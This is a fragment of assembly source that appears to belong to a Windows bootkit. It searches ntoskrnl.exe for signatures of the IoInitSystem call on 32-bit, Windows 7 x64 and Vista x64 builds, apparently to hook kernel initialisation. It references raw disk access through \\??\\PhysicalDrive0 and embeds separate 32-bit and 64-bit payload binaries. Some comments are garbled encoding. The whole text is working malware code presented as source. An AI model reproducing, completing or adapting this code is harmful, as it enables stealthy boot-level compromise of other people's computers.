; 56                   push    esi             ; DeviceObject
; E8 21 B5 FF FF       call    _IoInitSystem@4 ; IoInitSystem(x)
; 84 C0                test    al, al
; 75 07                jnz     short loc_7A6AE0
; 6A 69                push    69h
find_ntoskrnl_x32_sig_loop:
xor    ebx, ebx
mov    al, 0x6A
repne  scasb
jecxz  find_ntoskrnl_x32_sig_exit
cmp    dword [edi - 1], 0x196A4B6A
je     ntoskrnl_x32_sig_1_found
cmp    dword [edi - 1], 0x4B6A196A
jnz    find_ntoskrnl_x32_sig_loop
inc    edi
ntoskrnl_x32_sig_1_found:
cmp    byte [edi + 3], 0x89
jnz    ntoskrnl_x32_no_extended_sig
add    edi, 6

ntoskrnl_x32_no_extended_sig:
cmp    byte [edi + 3], 0xE8
jnz    find_ntoskrnl_x32_sig_loop
lea    edi, [edi + 8]
mov    al, 0xE8
repne  scasb
jnz    find_ntoskrnl_x32_sig_exit
cmp    word [edi + 4], 0xC084
xchg   ebx, edi ; � ebx ����� ������ �������� �� �������������� ������ ������� IoInitSystem.
jnz    find_ntoskrnl_x32_sig_loop

find_ntoskrnl_x32_sig_exit:
pop    edi
pop    ecx
ret



use64
align 16
find_ntoskrnl_x64_sig:
; ����:
;   ecx = SizeOfImage
;   rdi = Image base
; �����: rbx = ����� ������ E8 ������ ntoskrnl.exe (����� IoInitSystem).

push   rcx
push   rdi

xor    rbx, rbx

; Windows 7
; cc                   int     3
; 488bcd               mov     rcx,rbp
; c705ffe8ccffc4090000 mov dword ptr [nt!InbvProgressState (fffff800`028c8db0)],9C4h
; c705f9e8ccff4c1d0000 mov dword ptr [nt!InbvProgressState+0x4 (fffff800`028c8db4)],1D4Ch
; c705f3e8ccff32000000 mov dword ptr [nt!InbvProgressState+0x8 (fffff800`028c8db8)],32h
; e8f6c5ffff           call    nt!IoInitSystem (fffff800`02bf6ac0)
; 413ac5               cmp     al,r13b
; 750b                 jne     nt!Phase1InitializationDiscard+0x12aa (fffff800`02bfa4da)
; b969000000           mov     ecx,69h
; e837e7acff           call    nt!KeBugCheck (fffff800`026c8c10)
; cc                   int     3
; 488bd5               mov     rdx,rbp
; 418bcc               mov     ecx,r12d
find_ntoskrnl_x64_sig_loop:
mov    al, 0x41
repne  scasb
jecxz  find_ntoskrnl_x64_sig_vista
cmp    dword [rdi], 0x0B75C53A
jne    find_ntoskrnl_x64_sig_loop
cmp    dword [rdi + 4], 0x000069B9
jne    find_ntoskrnl_x64_sig_loop
;cmp    dword [rdi - 39], 0xC7CD8B48
;jne    find_ntoskrnl_x64_sig_loop
cmp    byte [rdi - 6], 0xE8
jne    find_ntoskrnl_x64_sig_loop
sub    rdi, 5
mov    rbx, rdi
jmp    find_ntoskrnl_x64_sig_exit

; Windows Vista
; cc                   int     3
; e82130fdff           call    nt!KeInitAmd64SpecificState (fffff800`01ccca60)
; 498bcc               mov     rcx,r12
; c705c4d2d1ffc4090000 mov dword ptr [nt!InbvProgressState (fffff800`01a16d10)],9C4h
; c705bed2d1ff4c1d0000 mov dword ptr [nt!InbvProgressState+0x4 (fffff800`01a16d14)],1D4Ch
; c705b8d2d1ff32000000 mov dword ptr [nt!InbvProgressState+0x8 (fffff800`01a16d18)],32h
; e82be6ffff           call    nt!IoInitSystem (fffff800`01cf8090)
; 403ac5               cmp     al,bpl
; 750b                 jne     nt!Phase1InitializationDiscard+0x1096 (fffff800`01cf9a75)
; b969000000           mov     ecx,69h
; e8ecb9b7ff           call    nt!KeBugCheck (fffff800`01875460)
; cc                   int     3
; 498bd4               mov     rdx,r12
; 418bcd               mov     ecx,r13d
find_ntoskrnl_x64_sig_vista:
pop    rdi
pop    rcx
push   rcx
push   rdi
mov    al, 0x40

find_ntoskrnl_x64_sig_vista_loop:
repne  scasb
jecxz  find_ntoskrnl_x64_sig_exit
cmp    dword [rdi], 0x0B75C53A
jne    find_ntoskrnl_x64_sig_vista_loop
cmp    dword [rdi + 4], 0x000069B9
jne    find_ntoskrnl_x64_sig_vista_loop
cmp    dword [rdi - 39], 0xC7CC8B49
jne    find_ntoskrnl_x64_sig_vista_loop
cmp    byte [rdi - 6], 0xE8
jne    find_ntoskrnl_x64_sig_vista_loop
sub    rdi, 5
mov    rbx, rdi

find_ntoskrnl_x64_sig_exit:
pop rdi
pop rcx
ret

global_data:
nop
nop
nop
nop
nop
nop
disk_drive_name:
                dd    0x00260024 ; 2*18 = size, 2*19 = max size (counted string)
                dw    "\","?","?","\","P","h","y","s","i","c","a","l","D","r","i","v","e","0",0
global_data_end:

payload_x32:
file "..\bin\payload_x32.bin"

payload_x64:
file "..\bin\payload_x64.bin"
payload_x64_end: